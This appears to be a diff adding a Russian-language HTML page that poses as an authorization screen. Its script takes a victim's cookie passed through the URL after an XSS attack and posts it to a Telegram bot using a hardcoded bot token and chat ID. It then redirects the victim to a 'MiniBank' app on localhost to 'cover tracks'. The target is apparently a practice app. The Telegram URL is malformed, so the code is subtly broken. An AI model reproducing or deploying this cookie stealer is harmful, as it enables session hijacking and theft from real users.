@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Загрузка снаряжения...</title>
+</head>
+
+<body>
+    <h3>Пожалуйста, подождите, идет авторизация...</h3>
+
+    <script>
+        // 1. Достаем куки из параметров URL страницы
+        const urlParams = new URLSearchParams(window.location.search);
+        const stolenCookie = urlParams.get('c');
+
+        if (stolenCookie) {
+            // Данные вашего бота (ВСТАВЬТЕ СВОИ ДАННЫЕ СЮДА)
+            const BOT_TOKEN = '8216789348:AAF9EA4IG9ISg-knVt8lUWek47To6KhF8Uo';
+            const CHAT_ID = '997150200';
+
+
+            const message = `🚨 СРАБОТАЛА XSS!\n\n🍪 Куки жертвы:\n${decodeURIComponent(stolenCookie)}`;
+
+            // 2. Отправляем скрытый запрос в Telegram API прямо из браузера
+            fetch(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            }).then(() => {
+                // 3. Заметаем следы: возвращаем пользователя назад в MiniBank
+                window.location.href = 'http://localhost:5000/';
+            });
+        }
+    </script>
+</body>
+
+</html>
